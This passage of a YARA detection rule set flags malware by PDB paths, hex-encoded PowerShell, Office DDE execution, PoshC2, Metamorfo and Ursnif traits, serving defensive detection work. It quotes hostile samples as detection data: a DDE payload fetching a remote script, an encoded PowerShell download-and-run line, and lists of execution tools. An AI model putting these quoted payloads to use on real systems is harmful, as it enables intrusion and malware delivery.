 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and filesize < 3MB
}
rule ConventionEngine_Keyword_Client
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "24a6ec8ebf9c0867ed1c097f4a653b8d"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}client[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and filesize < 3MB
}
rule ConventionEngine_Keyword_Server
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "24a6ec8ebf9c0867ed1c097f4a653b8d"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}server[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and filesize < 3MB
}
rule ConventionEngine_Term_GoogleDrive
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}(Google Drive|Google \xd0\xb4\xd0\xb8\xd1\x81\xd0\xba|Google \xe4\xba\x91\xe7\xab\xaf\xe7\xa1\xac\xe7\x9b\x98)[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_Windows
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "25b965b0f56a7dc8a0e2aa7e72778497"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\Windows\\[\x00-\xFF]{0,200}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_Documents
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "e766b979aecfc603b561b19e3880a7bc"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}\\Documents[\x00-\xFF]{0,200}\.pdb\x00/
 $this = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}\\Documents and Settings[\x00-\xFF]{0,200}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and not $this
}
rule ConventionEngine_Term_DocumentsAndSettings
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "e766b979aecfc603b561b19e3880a7bc"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}\\Documents and Settings[\x00-\xFF]{0,200}\.pdb\x00/
 $this = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}\\Documents\\[\x00-\xFF]{0,200}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and not $this
}
rule ConventionEngine_Term_Dropbox
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "5d6bfa1a1add10dbd6745ddf915812ed"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}dropbox[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_OneDrive
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}OneDrive[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_ConsoleApplication
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "4840ee7971322e1a6da801643432b25f"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}overflow[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_WindowsApplication
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "f097c1b0c8fe178de14717a4fc8f2a91"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}WindowsApplication[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_WindowsFormsApplication
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "b51c35d5606c173961b2aa4e6867b40a"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}WindowsFormsApplication[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_NewFolder
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "fe23fa6df4d8fb500859f0f76e92552d"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}New Folder[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_Copy
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "6156214b767254d5282bc7feef950dca"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}- Copy[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_Desktop
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "71cdba3859ca8bd03c1e996a790c04f9"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}Desktop[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_Users
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "09e4e6fa85b802c46bc121fcaecc5666"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}Users[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_Users_X
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "09e4e6fa85b802c46bc121fcaecc5666"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}\/Users\/[\x00-\xFF]{0,500}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_VisualStudio
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}Visual Studio[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Term_VmwareHost
{
 meta:
 author = "@itsreallynick"
 description = "Searching for PE files with PDB path keywords, terms, or anomalies. -YOUR BOY CARR"
 sample_md5 = "2742750991eb6687440ef53a7a93df94"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}\\\\vmware-host\\[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Anomaly_Slash
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "09e4e6fa85b802c46bc121fcaecc5666"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}\/[\x00-\xFF]{0,500}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Anomaly_NonAscii
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "07b62497e41898c22e5d5351607aac8e"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}[^\x00-\x7F]{1,}[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and filesize < 1MB
}
rule ConventionEngine_Anomaly_DriveShare
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "e7414d82d69b902b5bc1efd0f3e201d7"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}\\.{0,50}\\[a-zA-Z]\$\\[\x00-\xFF]{0,200}\.pdb\x00/ nocase
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Anomaly_MultiPDB_Double
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "013f3bde3f1022b6cf3f2e541d19353c"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre == 2
}
rule ConventionEngine_Anomaly_MultiPDB_Triple
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "013f3bde3f1022b6cf3f2e541d19353c"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre == 3
}
rule ConventionEngine_Anomaly_MultiPDB_Quadruple
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "063915c2ac8dcba0c283407ff91e48e1"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre == 4
}
rule ConventionEngine_Anomaly_MultiPDB_Quintuple_Plus
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "08faf27c5738b34186613b4c98905690"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre >= 5
}
rule ConventionEngine_Anomaly_Short_SingleChar
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "26f7394147f00ef7c3146ddcafb8f161"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[\x00-\xFF]{1}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Anomaly_Short_DoubleChar
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[\x00-\xFF]{2}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Anomaly_Short_TripleChar
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[\x00-\xFF]{3}\.pdb\x00/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Anomaly_NulledOut
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "94218fba95e3f03796dd005a2851b5af"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x01-\xFF]{16}[\x01-\xFF]{1}\x00\x00\x00[\x00]{10,500}/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Anomaly_NulledOut_DoublePlus
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "bf0fea133818387cca7eaef5a52c0aed"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x01-\xFF]{16}[\x01-\xFF]{1}\x00\x00\x00[\x00]{10,500}/
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre >= 2
}

rule ConventionEngine_Term_Users_User
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "b7c3039203278bc289fd3756571bd468"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}Users\\user[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule Hex_Encoded_Powershell
{
    meta:
        Author    = "InQuest Labs"
        Reference = "https://twitter.com/InQuest/status/1200125251675398149"
        Sample    = "https://labs.inquest.net/dfi/sha256/c430b2b2885804a638fc8d850b1aaca9eb0a981c7f5f9e467e44478e6bc961ee"
        Similar   = "https://labs.inquest.net/dfi/search/ext/ext_context/67697468756275736572636F6E74656E742E636F6D2F6A6F686E646F657465"

    strings:
        // http or https, powershell, invoke-webrequest
        // generated via: https://labs.inquest.net/tools/yara/iq-mixed-case
        $http = /[46]8[57]4[57]4[57]0([57]3)?3a2f2f/ nocase
        $powershell = /[57]0[46]f[57]7[46]5[57]2[57]3[46]8[46]5[46]c[46]c/ nocase
        $invoke = /[46]9[46]e[57]6[46]f[46]b[46]52d[57]7[46]5[46]2[57]2[46]5[57]1[57]5[46]5[57]3[57]4/ nocase

    condition:
        all of them
}
/*

 Follow the conversation on Twitter:

    https://twitter.com/i/moments/918126999738175489

 Read up on the exposure, mitigation, detection / hunting, and sample dissection from our blogs:

    http://blog.inquest.net/blog/2017/10/13/microsoft-office-dde-macro-less-command-execution-vulnerability/
    http://blog.inquest.net/blog/2017/10/14/02-microsoft-office-dde-freddie-mac-targeted-lure/
    http://blog.inquest.net/blog/2017/10/14/01-microsoft-office-dde-sec-omb-approval-lure/
    http://blog.inquest.net/blog/2017/10/14/03-microsoft-office-dde-poland-ransomware/

 InQuest customers can detect related events on their network by searching for:

    event ID 5000728, Microsoft_Office_DDE_Command_Exec

*/

rule MC_Office_DDE_Command_Execution
{
    meta:
        Author      = "InQuest Labs"
        URL         = "https://github.com/InQuest/yara-rules"
        Description = "This rule looks for a variety of DDE command execution techniques."

    strings:
        /*
            standard:
                <w:fldChar w:fldCharType="begin"/></w:r><w:r>
                <w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:rPr>
                <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/><w:color w:val="333333"/>
                <w:sz w:val="21"/><w:szCs w:val="21"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/></w:rPr>
                <w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r>
                <w:bookmarkStart w:id="0" w:name="_GoBack"/>
                <w:bookmarkEnd w:id="0"/><w:r>
                <w:instrText xml:space="preserve"> </w:instrText></w:r><w:r>
                <w:fldChar w:fldCharType="end"/></w:r>

            encompassed:
                # e 313fc5bd8e1109d35200081e62b7aa33197a6700fc390385929e71aabbc4e065
                [root@INQ-PPSandbox tge-zip-1-1]# cat xl/externalLinks/externalLink1.xml
                <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                <externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main">
                    <ddeLink xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" ddeService="cmd" ddeTopic=" /C Cscript %WINDIR%\System32\Printing_Admin_Scripts\en-US\Pubprn.vbs localhost &quot;script:https://gunsandroses.live/ticket-id&quot;">
                        <ddeItems>
                            <ddeItem name="A0" advise="1" />
                            <ddeItem name="StdDocumentName" ole="1" advise="1" />
                        </ddeItems
                        </ddeLink
                </externalLink>
        */

        // standard DDE with optional AUTO.
        $dde = />\s*DDE(AUTO)?\s*</ nocase wide ascii

        // NOTE: we must remain case-insensitive but do not wish to fire on "<w:webHidden/>".
        // NOTE: nocase does not apply to character ranges ([^A-Za-z0-9-]).
        $dde_auto = /<\s*w:fldChar\s+w:fldCharType\s*=\s*['"]begin['"]\s*\/>.+[^A-Za-z0-9-]DDEAUTO[^A-Za-z0-9-].+<w:fldChar\s+w:fldCharType\s*=\s*['"]end['"]\s*\/>/ nocase wide ascii

        // DDEAUTO is the only known vector at the moment, widening the detection here other possible vectors.
        $dde_other = /<\s*w:fldChar\s+w:fldCharType\s*=\s*['"]begin['"]\s*\/>.+[^A-Za-z0-9-]DDE[B-Zb-z]+[^A-Za-z0-9-].+<w:fldChar\s+w:fldCharType\s*=\s*['"]end['"]\s*\/>/ nocase wide ascii

        // a wider DDEAUTO condition for older versions of Word (pre 2007, non DOCX).
        $magic = /^\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\x00\x00\x00/
        $wide_dde_auto = /.+[^A-Za-z0-9-]DDEAUTO[^a-z0-9-].+/ nocase wide ascii

        // obfuscated with XML. use an early exit because this is an expensive regex.
        // NOTE: this is exactly the reason we have a DFI stack ... to strip, simplify, augment, transform, and make life easier for Yara rule dev.
        // NOTE: we prefer to use $xml_obfuscated, but it's not suitable for VTI hunt, perf warnings are a no-go.
        // NOTE: xml_obfuscated_{1,6} also won't fly for VTI, they are left here for reference.
        // NOTE: xml_obfuscated_{4,5} are prone to false positives, they are left here for reference.
        $early_exit       = "fldChar" nocase wide ascii
        //$xml_obfuscated   = /!?(<[^>]*>){0,10}['"]?(<[^>]*>){0,10}D(<[^>]*>){0,10}D(<[^>]*>){0,10}E(<[^>]*>){0,10}(A(<[^>]*>){0,10}U(<[^>]*>){0,10}T(<[^>]*>){0,10}O)?(<[^>]*>){0,10}['"]?/ nocase wide ascii
        //$xml_obfuscated_1 = />\s*["']?D\s*</   nocase ascii wide
        $xml_obfuscated_2 = />\s*["']?DD\s*</  nocase ascii wide
        $xml_obfuscated_3 = />\s*["']?DDE\s*</ nocase ascii wide
        //$xml_obfuscated_4 = />\s*DDE["']?\s*</ nocase ascii wide
        //$xml_obfuscated_5 = />\s*DE["']?\s*</  nocase ascii wide
        //$xml_obfuscated_6 = />\s*E["']?\s*</   nocase ascii wide

        // fully encompassed in XML
        $pure_xml_dde = /<\s*ddeLink[^>]+ddeService\s*=\s*["'](cmd|reg|mshta|regsvr32|[wc]script|powershell|bitsadmin|schtasks|rundll32)["'][^>]+ddeTopic/ nocase wide ascii

        // NOTE: these strings can be broken apart with XML constructs. additional post processing is required to avoid evasion.
        $exec_action = /(cmd\.exe|reg\.exe|mshta\.exe|regsvr32|[wc]script|powershell|bitsadmin|schtasks|rundll32)/ nocase wide ascii

        // QUOTE obfuscation technique.
        $quote_obfuscation = /w:instr\s*=\s*["']\s*QUOTE\s+\d+\s+/ nocase wide ascii

    condition:
        ((any of ($dde*) or ($magic at 0 and $wide_dde_auto)) and ($exec_action or $quote_obfuscation))
            or
        ($early_exit and any of ($xml_obfuscated*))
            or
        ($pure_xml_dde)
            or
        (
       	    // '{\rt' (note that full header is *NOT* required: '{\rtf1')
	    // trigger = '{\rt' nocase
            // generated via https://labs.inquest.net/tools/yara/iq-uint-trigger
    	    for any i in (0..30) : ((uint32be(i) | 0x2020) == 0x7b5c7274 and $exec_action)
        )
}
rule poshc2_apt_33_2019 {
    meta:
        author = "jeFF0Falltrades"
        desc = "Alerts on PoshC2 payloads which align with 2019 APT33 reporting (this will not fire on all PoshC2 payloads)"
        ref = "http://www.rewterz.com/rewterz-news/rewterz-threat-alert-iranian-apt-uses-job-scams-to-lure-targets"
    
    strings:
        $js_date = /\[datetime\]::ParseExact\("[0-9]+\/[0-9]+\/[0-9]+","dd\/MM\/yyyy",\$null/
        $js_crypt = "System.Security.Cryptography" wide ascii
        $js_host = "Headers.Add(\"Host" wide ascii
        $js_proxy = "$proxyurl = " wide ascii
        $js_arch = "$env:PROCESSOR_ARCHITECTURE" wide ascii
        $js_admin = "[System.Security.Principal.WindowsBuiltInRole]::Administrator" wide ascii
        $hta_unescape = "%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%76%62%73%63%72%69%70%74%22%3e%5c%6e%53%75%62%20%41%75%74%6f%4f%70%65%6e%28%29" wide ascii
        $hta_hex = "202f7720312049455820284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f352e3235322e3137382e32302f7261797468656f6e322d6a6f62732e6a706727293b" wide ascii
        $hta_powershell = "706f7765727368656c6c2e657865" wide ascii

    condition:
        4 of ($js_*) or 2 of ($hta_*)
}
rule metamorfo_msi {
  meta:
    author = "jeFF0Falltrades"
    ref = "https://blog.trendmicro.com/trendlabs-security-intelligence/analysis-abuse-of-custom-actions-in-windows-installer-msi-to-run-malicious-javascript-vbscript-and-powershell-scripts/"
    description = "This is a simple, albeit effective rule to detect most Metamorfo initial MSI payloads"

  strings:
    $str_1 = "replace(\"pussy\", idpp)" wide ascii nocase
    $str_2 = "GAIPV+idpp+\"\\\\\"+idpp" wide ascii nocase
    $str_3 = "StrReverse(\"TEG\")" wide ascii nocase
    $str_4 = "taller 12.2.1" wide ascii nocase
    $str_5 = "$bExisteArquivoLog" wide ascii nocase
    $str_6 = "function unzip(zipfile, unzipdir)" wide ascii nocase
    $str_7 = "DonaLoad(ArquivoDown" wide ascii nocase
    $str_8 = "putt_start" wide ascii nocase
    $str_9 = "FilesInZip= zipzipp" wide ascii nocase
    $str_10 = "@ u s e r p r o f i l e @\"+ppasta" wide ascii nocase
    $str_11 = "getFolder(unzipdir).Path" wide ascii nocase

  condition:
    2 of them
}
rule ursnif_zip_2019 {
  meta:
    author = "jeFF0Falltrades"
    reference = "https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html"

  strings:
    $doc_name = { 69 6e 66 6f 5f ?? ?? 2e ?? ?? 2e 64 6f 63 } // info_MM.DD.doc
    $zip_header = { 50 4B 03 04 }
    $zip_footer = { 50 4B 05 06 00 }

  condition:
    ($zip_header at 0) and ($doc_name in (0..48)) and ($zip_footer in (filesize-150..filesize))
}

rule ursnif_dropper_doc_2019 {
  meta:
    author = "jeFF0Falltrades"
    reference = "https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html"

  strings:
    $sleep = "WScript.Sleep(56000)" wide ascii nocase
    $js = ".js" wide ascii
    $ret = { 72 65 74 75 72 6e 20 22 52 75 22 20 2b 20 22 5c 78 36 65 22 } // return "Ru" + "\x6e"
    $pse = { 70 6f 77 65 72 73 68 65 6c 6c 20 2d 45 6e 63 20 } //powershell -Enc

  condition:
    uint16(0) == 0xcfd0 and all of them
}

/*
   Yara Rule Set
   Author: Ian.Ahl@fireeye.com @TekDefense, modified by Florian Roth
   Date: 2017-06-05
   Identifier: APT19
   Reference: https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html
*/

rule Beacon_K5om {
   meta:
      description = "Detects Meterpreter Beacon - file K5om.dll"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
